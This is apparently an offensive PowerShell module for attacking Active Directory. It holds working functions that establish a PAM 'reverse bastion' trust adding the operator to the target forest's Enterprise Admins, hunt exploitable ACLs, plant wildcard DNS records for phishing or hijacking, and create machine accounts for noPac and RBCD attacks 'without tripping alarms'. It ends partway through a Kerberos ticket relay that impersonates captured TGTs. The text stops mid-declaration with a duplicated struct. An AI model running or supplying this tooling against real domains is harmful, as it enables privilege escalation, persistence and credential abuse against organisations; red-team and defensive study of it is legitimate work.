<#
.SYNOPSIS
Adds a DNS conditional forwarder for a target domain.

.DESCRIPTION
Creates a DNS conditional forwarder zone pointing to the specified IP address for the given domain.
If the zone already exists, the function returns without modification.

.PARAMETER TargetDomain
The fully qualified domain name (FQDN) to create a forwarder for.

.PARAMETER TargetIP
The IP address of the DNS server to forward queries to.

.EXAMPLE
Add-TargetDnsForwarder -TargetDomain "corp.example.com" -TargetIP "192.168.1.53"
Adds a DNS forwarder for corp.example.com pointing to 192.168.1.53.

.NOTES
This function requires DNS administrative privileges.
Useful for establishing DNS resolution for trust relationships between forests.

.INPUTS
System.String
Accepts domain name and IP address as strings.

.OUTPUTS
None or Microsoft.Management.Infrastructure.CimInstance if the forwarder is created.
#>
function Add-TargetDnsForwarder {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetDomain,
        [Parameter(Mandatory=$true)]
        [string]$TargetIP
    )

    $zone = try { Get-DnsServerZone -Name $TargetDomain -ErrorAction SilentlyContinue } catch { }

    if ($null -eq $zone) {
        Add-DnsServerConditionalForwarderZone -Name $TargetDomain -MasterServers $TargetIP -PassThru
    }
}

<#
.SYNOPSIS
Establishes a one-way PAM trust relationship between two Active Directory forests.

.DESCRIPTION
Creates a reverse bastion trust (also known as a PAM trust) between the current forest and a target forest.
Configures DNS forwarders, enables PAM features, and creates shadow principals for cross-forest authentication.
Supports both password-based and Pass-The-Ticket authentication methods.

.PARAMETER TargetDomain
The fully qualified domain name (FQDN) of the target forest.

.PARAMETER TargetDC
The hostname or FQDN of a domain controller in the target forest.

.PARAMETER Credential
PSCredential object containing credentials for authentication to the target domain.
Used with the PasswordAuth parameter set.

.PARAMETER CurrentIP
The IP address of the current domain's DNS server.

.PARAMETER TargetIP
The IP address of the target domain's DNS server.

.PARAMETER PTT
Indicates Pass-The-Ticket authentication should be used instead of password authentication.

.PARAMETER TrustPassword
The trust password to use when establishing the trust relationship.
Required when using Pass-The-Ticket authentication.

.EXAMPLE
$cred = Get-Credential
Invoke-ReverseBastion -TargetDomain "target.example.com" -TargetDC "DC01.target.example.com" `
    -Credential $cred -CurrentIP "192.168.1.53" -TargetIP "192.168.2.53"
Establishes a reverse bastion trust with password-based authentication.

.EXAMPLE
Invoke-ReverseBastion -TargetDomain "target.example.com" -TargetDC "DC01.target.example.com" `
    -CurrentIP "192.168.1.53" -TargetIP "192.168.2.53" -PTT -TrustPassword "MyTrustPassword123!"
Establishes a reverse bastion trust using Pass-The-Ticket authentication.

.NOTES
Requires Domain Admin privileges in the current forest.
Suppresses PSAvoidUsingPlainTextForPassword warning as plaintext is only used for trust creation.
Automatically enables the PAM feature if not already enabled.
Creates and configures shadow principals for cross-forest access.

.INPUTS
System.String, System.Management.Automation.PSCredential, System.Management.Automation.SwitchParameter

.OUTPUTS
None. Function modifies AD configuration directly.
#>
function Invoke-ReverseBastion {
    [CmdletBinding(DefaultParameterSetName="PasswordAuth")]

    # Unfortunately, `CreateLocalSideOfTrustRelationship()` and `UpdateLocalSideOfTrustRelationship()`
    # [don't allow for passing a secure string](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.forest.createtrustrelationship?view=windowsdesktop-11.0),
    # so we have to suppress the warning about using plaintext passwords here.
    # The password is only used for the trust relationship and isn't stored anywhere, so this is an acceptable risk in this context.
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Scope='Function')]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetDomain,
        [Parameter(Mandatory=$true)]
        [string]$TargetDC,
        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)] 
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory=$true)]
        [string]$CurrentIP,
        [Parameter(Mandatory=$true)]
        [string]$TargetIP,
        [Parameter(ParameterSetName="PassTheTicket")]
        [switch]$PTT,
        [Parameter(ParameterSetName="PassTheTicket", Mandatory=$true)]
        [string]$TrustPassword
    )

    Import-Module ActiveDirectory
    [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.ActiveDirectory")

    $CurrentDomain = $Env:USERDNSDOMAIN

    $feature = Get-ADOptionalFeature -Identity 'Privileged Access Management Feature'
    $scopes = $feature.EnabledScopes

    if ([string]$scopes -eq '') {
        Enable-ADOptionalFeature -Identity 'Privileged Access Management Feature' -Scope ForestOrConfigurationSet -Target $CurrentDomain
    }
    
    try {
        Resolve-DnsName -Name $TargetDomain
    } catch {
        Add-DnsServerConditionalForwarderZone -Name $TargetDomain -MasterServers $TargetIP -PassThru
    }
    
    if ($PTT) {
        Invoke-Command -ComputerName $TargetDC -ScriptBlock {
            Add-DnsServerConditionalForwarderZone -Name $using:CurrentDomain -MasterServers $using:CurrentIP -PassThru
        }
    } else {
        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock {
            Add-DnsServerConditionalForwarderZone -Name $using:CurrentDomain -MasterServers $using:CurrentIP -PassThru
        }
    }

    $targetSid = if ($PTT) {
        (Get-ADGroup -Identity 'Enterprise Admins' -Server $TargetDC).SID.Value
    } else {
        (Get-ADGroup -Identity 'Enterprise Admins' -Server $TargetDC -Credential $Credential).SID.Value
    }

    $trustpass = if ($PTT) {
        $TrustPassword
    } else {
        $Credential.GetNetworkCredential().Password
    }

    $block = {
        param(
            [string]$BastionDomain,
            [string]$TrustPassword
        )
        [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.ActiveDirectory")

        try {
            [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateLocalSideOfTrustRelationship(
                $BastionDomain,
                [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
                $TrustPassword
            )
        } catch [System.DirectoryServices.ActiveDirectory.ActiveDirectoryObjectExistsException] {
            Write-Host "Local side of trust relationship already exists; updating instead of creating anew"
            [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().UpdateLocalSideOfTrustRelationship(
                $BastionDomain,
                [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
                $TrustPassword
            )
        }

        netdom trust $BastionDomain /ForestTransitive:yes
        netdom trust $BastionDomain /EnableSIDHistory:yes
        netdom trust $BastionDomain /EnablePIMTrust:yes
        netdom trust $BastionDomain /Verify
    }

    try {
        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateTrustRelationship(
            $TargetDomain,
            [System.DirectoryServices.ActiveDirectory.TrustDirection]::Inbound
        )
    } catch [System.DirectoryServices.ActiveDirectory.ActiveDirectoryObjectExistsException] {
        Write-Host "Trust relationship already exists; skipping creation"
    }

    try {
        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateLocalSideOfTrustRelationship(
            $TargetDomain,
            [System.DirectoryServices.ActiveDirectory.TrustDirection]::Inbound,
            $trustpass
        )
    } catch [System.DirectoryServices.ActiveDirectory.ActiveDirectoryObjectExistsException] {
        Write-Host "Local side of trust relationship already exists; updating instead of creating anew"
        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().UpdateLocalSideOfTrustRelationship(
            $TargetDomain,
            [System.DirectoryServices.ActiveDirectory.TrustDirection]::Inbound,
            $trustpass
        )
    }

    if ($PTT) {
        Invoke-Command -ComputerName $TargetDC -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -TrustPassword $trustpass"
    } else {
        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -TrustPassword $trustpass"
    }

    $shadowcontainer = "CN=Shadow Principal Configuration,CN=Services,$((Get-ADRootDSE).ConfigurationNamingContext)"

    $targetnbname = if ($PTT) {
        (Get-ADDomain -Server $TargetDC).NetBIOSName
    } else {
        (Get-ADDomain -Server $TargetDC -Credential $Credential).NetBIOSName
    }

    $targetgroupname = $targetnbname + '-Enterprise-Admins'

    New-ADObject -Type 'msDS-ShadowPrincipal' -Name $targetgroupname -Path $shadowcontainer -OtherAttributes @{'msDS-ShadowPrincipalSid'="$targetSid"}
    Set-ADObject -Identity "CN=$targetgroupname,$shadowcontainer" -Add @{'member'="$((Get-ADUser -Identity $Env:USERNAME).DistinguishedName)"} -Verbose

    # Verify
    Get-ADObject -Identity "CN=$targetgroupname,$shadowcontainer" -Properties Member, msDS-ShadowPrincipalSid
}

<#
.SYNOPSIS
Identifies interesting ACLs on remote Active Directory objects.

.DESCRIPTION
Enumerates objects in a remote domain that are not Domain Admins or Domain Controllers,
then searches their group memberships for ACLs that grant dangerous permissions.
Dangerous permissions include GenericAll, Write*, Create*, Force-Change-Password, and Enroll rights.
Supports both password-based and Pass-The-Ticket authentication methods.

.PARAMETER Credential
PSCredential object containing credentials for authentication to the remote server.
Used with the PasswordAuth parameter set.

.PARAMETER ComputerName
The hostname, FQDN, or IP address of the remote domain controller.

.PARAMETER PTT
Indicates Pass-The-Ticket authentication should be used instead of password authentication.

.EXAMPLE
$cred = Get-Credential
Find-InterestingRemoteAcl -Credential $cred -ComputerName "dc01.target.example.com"
Finds interesting ACLs using password-based authentication.

.EXAMPLE
Find-InterestingRemoteAcl -ComputerName "dc01.target.example.com" -PTT
Finds interesting ACLs using Pass-The-Ticket authentication.

.NOTES
Requires appropriate permissions to enumerate Active Directory objects and ACLs on the remote server.
Creates a temporary PSDrive for the remote domain.
Results are formatted as lists showing objects with dangerous permissions.

.INPUTS
System.Management.Automation.PSCredential, System.String, System.Management.Automation.SwitchParameter

.OUTPUTS
Microsoft.ActiveDirectory.Management.ADObject with Access Control information.
#>
function Find-InterestingRemoteAcl {
    [CmdletBinding(DefaultParameterSetName="PasswordAuth")]
    param(
        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)] 
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory=$true)]
        [string]$ComputerName,
        [Parameter(ParameterSetName="PassTheTicket")]
        [switch]$PTT
    )

    if ($PTT) {
        $dom = (Get-ADDomain -Server $ComputerName).NetBIOSName
        New-PSDrive -Name $dom -PSProvider ActiveDirectory -Server $ComputerName -Root "//RootDSE/" -Scope Global

        $LDAPFilter = "(&"
        $LDAPFilter += "(|(objectClass=user)(objectClass=computer))"
        Get-ADGroup -LDAPFilter '(adminCount=1)' -Server $ComputerName | ForEach-Object {
            $LDAPFilter += "(!(memberof=$((Get-ADGroup -Identity $_ -Server $ComputerName).DistinguishedName)))"
        }
        Get-ADDomainController -Filter * -Server $ComputerName | ForEach-Object {
            $LDAPFilter += "(!(distinguishedName=$($_.ComputerObjectDN)))"
        }
        $LDAPFilter += '(!(sAMAccountName=krbtgt))'
        $LDAPFilter += ')'

        Get-ADObject -LDAPFilter $LDAPFilter -Server $ComputerName -Properties MemberOf | ForEach-Object {
            $user = $_
            $groups = Get-ADPrincipalGroupMembership -Identity $user -Server $ComputerName
            (Get-ADRootDSE -Server $ComputerName).NamingContexts | ForEach-Object {
                $nc = $_
                $groups | ForEach-Object {
                    $group = $_.Name
                    Get-ChildItem -Path ("$dom" + ":\$nc") -Recurse -Force | ForEach-Object {
                        Get-Acl -Path ("$dom" + ":\$_") | Select-Object PSChildName -ExpandProperty Access | Where-Object {
                            ($_.IdentityReference -eq "$dom\$user" -or $_.IdentityReference -eq "$dom\$group") -and `
                            $_.AccessControlType -eq "Allow" -and ( `
                                $_.ActiveDirectoryRights -eq "GenericAll" -or `
                                $_.ActiveDirectoryRights -like "*Write*" -or `
                                $_.ActiveDirectoryRights -like "*Create*" -or `
                                $_.ActiveDirectoryRights -like '*Force-Change-Password*' -or `
                                $_.ActiveDirectoryRights -eq "Enroll"
                            )
                        }
                    }
                }
            }
        } | Format-List

        Remove-PSDrive -Name $dom
    } else {
        $dom = (Get-ADDomain -Server $ComputerName -Credential $Credential).NetBIOSName
        New-PSDrive -Name $dom -PSProvider ActiveDirectory -Server $ComputerName -Root "//RootDSE/" -Credential $Credential -Scope Global

        $LDAPFilter = "(&"
        $LDAPFilter += "(|(objectClass=user)(objectClass=computer))"
        Get-ADGroup -LDAPFilter '(adminCount=1)' -Server $ComputerName -Credential $Credential | ForEach-Object {
            $LDAPFilter += "(!(memberof=$((Get-ADGroup -Identity $_ -Server $ComputerName -Credential $Credential).DistinguishedName)))"
        }
        Get-ADDomainController -Filter * -Server $ComputerName -Credential $Credential | ForEach-Object {
            $LDAPFilter += "(!(distinguishedName=$($_.ComputerObjectDN)))"
        }
        $LDAPFilter += '(!(sAMAccountName=krbtgt))'
        $LDAPFilter += ')'

        Get-ADObject -LDAPFilter $LDAPFilter -Server $ComputerName -Credential $Credential -Properties MemberOf | ForEach-Object {
            $user = $_
            $groups = Get-ADPrincipalGroupMembership -Identity $user -Server $ComputerName -Credential $Credential
            (Get-ADRootDSE -Server $ComputerName -Credential $Credential).NamingContexts | ForEach-Object {
                $nc = $_
                $groups | ForEach-Object {
                    $group = $_.Name
                    Get-ChildItem -Path ("$dom" + ":\$nc") -Recurse -Force | ForEach-Object {
                        Get-Acl -Path ("$dom" + ":\$_") | Select-Object PSChildName -ExpandProperty Access | Where-Object {
                            ($_.IdentityReference -eq "$dom\$user" -or $_.IdentityReference -eq "$dom\$group") -and `
                            $_.AccessControlType -eq "Allow" -and ( `
                                $_.ActiveDirectoryRights -eq "GenericAll" -or `
                                $_.ActiveDirectoryRights -like "*Write*" -or `
                                $_.ActiveDirectoryRights -like "*Create*" -or `
                                $_.ActiveDirectoryRights -like '*Force-Change-Password*' -or `
                                $_.ActiveDirectoryRights -eq "Enroll"
                            )
                        }
                    }
                }
            }
        } | Format-List

        Remove-PSDrive -Name $dom
    }
}

<#
.SYNOPSIS
Generates an RDP connection file with embedded credentials.

.DESCRIPTION
Creates a Remote Desktop Protocol (RDP) file configured with specified connection parameters,
resolution settings, and encrypted credentials for automated connection.
Attempts to map a network drive from the RDP session if available.

.PARAMETER User
The username for RDP authentication, typically in domain\username format.

.PARAMETER Password
The plaintext password for RDP authentication.

.PARAMETER IP
The IP address or hostname of the remote RDP server.

.PARAMETER FileName
The output filename for the RDP file (without extension, .rdp will be added).

.PARAMETER Width
The desktop width in pixels. Default is 2880.

.PARAMETER Height
The desktop height in pixels. Default is 1620.

.PARAMETER Port
The RDP port on the remote server. Default is 3389.

.PARAMETER FullScreen
If specified, the RDP session will start in fullscreen mode.

.EXAMPLE
Gen-RDPFile -User "CORP\Administrator" -Password "P@ssw0rd!" -IP "192.168.1.10" -FileName "admin_session"
Creates an RDP file named "admin_session.rdp" at the default resolution.

.EXAMPLE
Gen-RDPFile -User "CORP\Administrator" -Password "P@ssw0rd!" -IP "192.168.1.10" `
    -FileName "admin_session" -Width 1920 -Height 1080 -FullScreen
Creates a fullscreen RDP file at 1920x1080 resolution.

.NOTES
Uses approved verb suppression (Gen is not approved) for backward compatibility.
Credentials are encrypted in the RDP file using SecureString conversion.
WARNING: This function stores credentials. Use only in trusted environments.
Output file is created in the current working directory.

.INPUTS
System.String, System.Int32, System.Management.Automation.SwitchParameter

.OUTPUTS
System.IO.FileInfo for the created RDP file.
#>
function Gen-RDPFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '', Scope='Function')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Scope='Function')]
    Param (
        [string]$User,
        [string]$Password,
        [string]$IP,
        [string]$FileName,
        [int]$Width = 2880,
        [int]$Height = 1620,
        [int]$Port = 3389,
        [switch]$FullScreen
    )

    $enc = ConvertTo-SecureString $Password -AsPlainText -Force | ConvertFrom-SecureString

    $screenMode = if ($FullScreen) {
        2
    } else {
        1
    }

    if ($(Test-Path -Path '\\tsclient\c')) {
        net use E: '\\tsclient\c'
    } elseif ($(Test-Path -Path '\\tsclient\e')) {
        net use E: '\\tsclient\e'
    }

    $fileContents = @"
screen mode id:i:$screenMode
use multimon:i:0
desktopwidth:i:$Width
desktopheight:i:$Height
session bpp:i:32
winposstr:s:0,1,465,143,3363,1810
compression:i:1
keyboardhook:i:2
audiocapturemode:i:0
videoplaybackmode:i:1
connection type:i:7
networkautodetect:i:1
bandwidthautodetect:i:1
displayconnectionbar:i:1
enableworkspacereconnect:i:0
disable wallpaper:i:0
allow font smoothing:i:0
allow desktop composition:i:0
disable full window drag:i:1
disable menu anims:i:1
disable themes:i:0
disable cursor setting:i:0
bitmapcachepersistenable:i:1
full address:s:${IP}:${Port}
audiomode:i:0
redirectprinters:i:1
redirectcomports:i:0
redirectsmartcards:i:1
redirectclipboard:i:1
redirectposdevices:i:0
autoreconnection enabled:i:1
authentication level:i:2
prompt for credentials:i:0
negotiate security layer:i:1
remoteapplicationmode:i:0
alternate shell:s:
shell working directory:s:
gatewayhostname:s:
gatewayusagemethod:i:4
gatewaycredentialssource:i:4
gatewayprofileusagemethod:i:0
promptcredentialonce:i:0
gatewaybrokeringtype:i:0
use redirection server name:i:0
rdgiskdcproxy:i:0
kdcproxyname:s:
remoteappmousemoveinject:i:1
redirectlocation:i:0
redirectwebauthn:i:1
enablerdsaadauth:i:0
drivestoredirect:s:*
username:s:$User
password 51:b:$enc
"@;

    $fileContents | Out-File -FilePath $PWD\$FileName.rdp -Force
}

<#
.SYNOPSIS
Adds a wildcard DNS A record on a remote DNS server.

.DESCRIPTION
Creates a wildcard DNS A record (*) in the local domain's DNS zone on a remote domain controller.
All queries to *.localdomain will be resolved to the specified LocalIP address.

.PARAMETER TargetDC
The hostname or FQDN of the remote domain controller running DNS.

.PARAMETER LocalIP
The IP address that wildcard DNS queries should resolve to.

.EXAMPLE
Add-RemoteDnsWildcardRecord -TargetDC "dc01.example.com" -LocalIP "192.168.1.10"
Adds a wildcard DNS record on dc01.example.com pointing to 192.168.1.10.

.NOTES
Requires DNS administrative privileges on the target domain controller.
Uses the current user's domain (from $Env:USERDNSDOMAIN) as the target zone.
Useful for redirecting all subdomains in a zone for phishing or DNS hijacking.

.INPUTS
System.String

.OUTPUTS
Microsoft.Management.Infrastructure.CimInstance representing the created DNS record.
#>
function Add-RemoteDnsWildcardRecord {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetDC,
        [Parameter(Mandatory=$true)]
        [string]$LocalIP
    )

    $ZoneName = $Env:USERDNSDOMAIN
    Add-DnsServerResourceRecordA -Name '*' -ZoneName $ZoneName -IPv4Address $LocalIP -ComputerName $TargetDC -ErrorAction Stop
}

<#
.SYNOPSIS
Establishes an interactive WinRM session using plaintext credentials.

.DESCRIPTION
Creates and enters an interactive PowerShell Remoting session to a remote computer
using provided username and password credentials.

.PARAMETER TargetComputer
The hostname, FQDN, or IP address of the remote computer.

.PARAMETER Username
The username for authentication, in domain\username or username@domain format.

.PARAMETER Password
The plaintext password for authentication.

.EXAMPLE
Enter-PlaintextWinRMSession -TargetComputer "server.example.com" -Username "CORP\Administrator" -Password "P@ssw0rd!"
Establishes an interactive session to server.example.com.

.NOTES
Requires WinRM to be enabled and accessible on the target computer.
WARNING: Credentials are passed in plaintext. Use only in trusted environments or test scenarios.
The session remains open until the user exits (using 'Exit-PSSession' or 'exit').

.INPUTS
System.String

.OUTPUTS
None. Enters interactive session mode.
#>
function Enter-PlaintextWinRMSession {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Scope='Function')]
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetComputer,
        [Parameter(Mandatory=$true)]
        [string]$Username,
        [Parameter(Mandatory=$true)]
        [string]$Password
    )
    $pass = ConvertTo-SecureString $Password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ($Username, $pass)

    Enter-PSSession -ComputerName $TargetComputer -Credential $cred
}

<#
.SYNOPSIS
Creates a new machine account on the target domain.

.DESCRIPTION
Adds a new computer account to the target domain. Useful for testing for vulnerabilities like BadSuccessor, noPac, and misconfigurations like RBCD without tripping alarms.

.PARAMETER TargetDC
The hostname or FQDN of the remote domain controller.

.PARAMETER MachineName
The name of the machine account to create.

.PARAMETER Password
The password for the new machine account.

.EXAMPLE
Add-RemoteMachineAccount -TargetDC "dc01.example.com" -MachineName "WEB01" -Password "P@ssw0rd!"
Creates a new machine account named WEB01 on dc01.example.com.

.NOTES
Requires appropriate permissions to create computer accounts in the target domain.
The password must meet the domain's complexity requirements.

.INPUTS
System.String, System.Management.Automation.PSCredential, System.Management.Automation.SwitchParameter

.OUTPUTS
None. Creates a new computer account in Active Directory.

#>
function Add-RemoteMachineAccount {
    [CmdletBinding(DefaultParameterSetName="PasswordAuth")]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetDC,
        [Parameter(Mandatory=$true)]
        [string]$MachineName,
        [Parameter(Mandatory=$true)]
        [string]$MachinePassword,
        [Parameter(Mandatory=$true, ParameterSetName="PasswordAuth")]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory=$true, ParameterSetName="PassTheTicket")]
        [switch]$PTT
    )

    $securePass = ConvertTo-SecureString $MachinePassword -AsPlainText -Force
    
    $adParams = @{
        Name            = $MachineName
        SamAccountName  = "$MachineName$"
        AccountPassword = $securePass
        Enabled         = $true
        Server          = $TargetDC
    }

    if (-not $PTT) { $adParams["Credential"] = $Credential }

    try {
        New-ADComputer @adParams
        Write-Host "Successfully created account for $MachineName" -ForegroundColor Green
    } catch {
        Write-Error "Failed to create account: $($_.Exception.Message)"
    }
}

<#
.SYNOPSIS
Relays Kerberos tickets via DNS to establish cross-forest authentication.

.DESCRIPTION
Monitors the Kerberos ticket cache and automatically relays incoming Kerberos Ticket Granting Tickets (TGTs)
for a target domain to establish authenticated sessions. Uses LSA (Local Security Authority) APIs to query
and process Kerberos tickets, then launches new PowerShell processes with impersonated credentials.
Supports both password-based and Pass-The-Ticket authentication methods for initial setup.

This function is typically used in advanced AD exploitation scenarios where DNS-based Kerberos relay attacks
are performed between forests or domains.

.PARAMETER TargetDC
The hostname or FQDN of the target domain controller.
Used to determine the target domain's DNS root for ticket matching.

.PARAMETER LocalIP
The IP address of the local machine or listener that will receive relayed tickets.
Used in conjunction with DNS configuration for the relay attack.

.PARAMETER Credential
PSCredential object containing username and password for authentication to the target domain.
Only used with the PasswordAuth parameter set.
Not required when using Pass-The-Ticket authentication (PTT).

.PARAMETER PTT
Switch parameter indicating Pass-The-Ticket authentication should be used instead of password credentials.
When specified, existing Kerberos tickets are used instead of password-based logon.
Suppresses the requirement for the Credential parameter.

.EXAMPLE
$cred = Get-Credential -UserName "CORP\Administrator"
Invoke-DnsKrbRelay -TargetDC "dc01.corp.example.com" -LocalIP "192.168.1.50" -Credential $cred
Starts relaying Kerberos tickets to 192.168.1.50 using password-based authentication.

.EXAMPLE
Invoke-DnsKrbRelay -TargetDC "dc01.corp.example.com" -LocalIP "192.168.1.50" -PTT
Starts relaying Kerberos tickets using existing cached credentials via Pass-The-Ticket.

.NOTES
Requires appropriate permissions to query Kerberos ticket cache on the local system.
Uses Win32 LSA APIs: LsaConnectUntrusted, LsaLookupAuthenticationPackage, LsaCallAuthenticationPackage, and LsaLogonUser.
Runs an infinite loop querying the ticket cache every 5 seconds.
Creates background jobs to launch impersonated PowerShell processes when tickets are found.
Memory from LSA buffers is freed after processing to prevent leaks.

.INPUTS
System.String, System.Management.Automation.PSCredential, System.Management.Automation.SwitchParameter

.OUTPUTS
None. Creates background jobs for impersonated PowerShell processes when tickets are found.
#>
function Invoke-DnsKrbRelay {
    [CmdletBinding(DefaultParameterSetName="PasswordAuth")]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetDC,
        [Parameter(Mandatory=$true)]
        [string]$LocalIP,
        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(ParameterSetName="PassTheTicket")]
        [switch]$PTT
    )
    
    $TargetDomain = if ($PTT) {
        (Get-ADDomain -Server $TargetDC).DNSRoot
    } else {
        (Get-ADDomain -Server $TargetDC -Credential $Credential).DNSRoot
    }

    $signature = @"
using System;
using System.Runtime.InteropServices;

namespace KerberosAuth {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    public enum KERB_LOGON_SUBMIT_TYPE : int {
        KerbInteractiveLogon = 2,
        KerbSmartCardLogon = 6,
        KerbWorkstationUnlockLogon = 7,
        KerbSmartCardUnlockLogon = 8,
        KerbProxyLogon = 9,
        KerbTicketLogon = 10,
        KerbTicketUnlockLogon = 11,
        KerbS4ULogon = 12, // Service for User
        KerbCertificateLogon = 13,
        KerbCertificateS4ULogon = 14,
        KerbCertificateUnlockLogon = 15,
        KerbNoElevationLogon = 83,
        KerbLuidLogon = 84
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct KERB_INTERACTIVE_LOGON {
        public KERB_LOGON_SUBMIT_TYPE MessageType;
        public UNICODE_STRING LogonDomainName;
        public UNICODE_STRING UserName;
        public UNICODE_STRING Password;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct KERB_TICKET_LOGON {
        public KERB_LOGON_SUBMIT_TYPE MessageType;
        public uint Flags;
        public uint ServiceTicketLength;
        public uint TicketGrantingTicketLength;
        public IntPtr ServiceTicket;
        public IntPtr TicketGrantingTicket;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct KERB_CRYPTO_KEY {
        public uint KeyType;
        public uint Length;
        public IntPtr Value;
    }
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct KERB_EXTERNAL_TICKET
    {
        public IntPtr ServiceName; // PKERB_EXTERNAL_NAME
        public IntPtr TargetName;  // PKERB_EXTERNAL_NAME
        public IntPtr ClientName;  // PKERB_EXTERNAL_NAME
        public UNICODE_STRING DomainName;
        public UNICODE_STRING TargetDomainName;
        public UNICODE_STRING AltTargetDomainName;
        public KERB_CRYPTO_KEY SessionKey;
        public uint TicketFlags;
        public uint Flags;
        public long KeyExpirationTime; // LARGE_INTEGER
        public long StartTime;         // LARGE_INTEGER
        public long EndTime;           // LARGE_INTEGER
        public long RenewUntil;        // LARGE_INTEGER
        public long TimeSkew;          // LARGE_INTEGER
        public uint EncodedTicketSize;
        public IntPtr EncodedTicket;   // PUCHAR
    }

    public enum KERB_PROFILE_BUFFER_TYPE : int {
        KerbInteractiveProfile = 2,
        KerbSmartCardProfile = 4,
        KerbTicketProfile = 6
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct KERB_INTERACTIVE_PROFILE {
        public KERB_PROFILE_BUFFER_TYPE MessageType;
        public ushort LogonCount;
        public ushort BadPasswordCount;
        public long LogonTime;
        public long LogoffTime;
        public long KickOffTime;
        public long PasswordLastSet;
        public long PasswordCanChange;
        public long PasswordMustChange;
        public UNICODE_STRING LogonScript;
        public UNICODE_STRING HomeDirectory;
        public UNICODE_STRING FullName;
        public UNICODE_STRING ProfilePath;
        public UNICODE_STRING HomeDirectoryDrive;
        public UNICODE_STRING LogonServer;
        public uint UserFlags;
    }

    public enum KERB_PROTOCOL_MESSAGE_TYPE : int {
        KerbDebugRequestMessage = 0,
        KerbQueryTicketCacheMessage = 1,
        KerbChangeMachinePasswordMessage = 2,
        KerbVerifyPacMessage = 3,
        KerbRetrieveTicketMessage = 4,
        KerbUpdateAddressesMessage = 5,
        KerbPurgeTicketCacheMessage = 6,
        KerbChangePasswordMessage = 7,
        KerbRetrieveEncodedTicketMessage = 8,
        KerbDecryptDataMessage = 9,
        KerbAddBindingCacheEntryMessage = 10,
        KerbSetPasswordMessage = 11,
        KerbSetPasswordExMessage = 12,
        KerbVerifyCredentialsMessage = 13,
        KerbQueryTicketCacheExMessage = 14,
        KerbPurgeTicketCacheExMessage = 15,
        KerbRefreshSmartcardCredentialsMessage = 16,
        KerbAddExtraCredentialsMessage = 17,
        KerbQuerySupplementalCredentialsMessage = 18,
        KerbTransferCredentialsMessage = 19,
        KerbQueryTicketCacheEx2Message = 20,
        KerbSubmitTicketMessage = 21,
        KerbAddExtraCredentialsExMessage = 22,
        KerbQueryKdcProxyCacheMessage = 23,
        KerbPurgeKdcProxyCacheMessage = 24,
        KerbQueryTicketCacheEx3Message = 25,
        KerbCleanupMachinePkinitCredsMessage = 26,
        KerbAddBindingCacheEntryExMessage = 27,
        KerbQueryBindingCacheMessage = 28,
        KerbPurgeBindingCacheMessage = 29,
        KerbPinKdcMessage = 30,
        KerbUnpinAllKdcsMessage = 31,
        KerbQueryDomainExtendedPoliciesMessage = 32,
        KerbQueryS4U2ProxyCacheMessage = 33,
        KerbRetrieveKeyTabMessage = 34,
        KerbRefreshPolicyMessage = 35,
        KerbPrintCloudKerberosDebugMessage = 36,
        KerbNetworkTicketLogonMessage = 37,
        KerbNlChangeMachinePasswordMessage = 38
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct KERB_ADD_BINDING_CACHE_ENTRY_EX_REQUEST {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public UNICODE_STRING RealmName;
        public UNICODE_STRING KdcAddress;
        public ulong AddressType;
        public ulong DcFlags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_ADD_CREDENTIALS_REQUEST
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public UNICODE_STRING UserName;
        public UNICODE_STRING DomainName;
        public UNICODE_STRING Password;
        public LUID LogonId;
        public uint Flags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_INTERACTIVE_PROFILE {
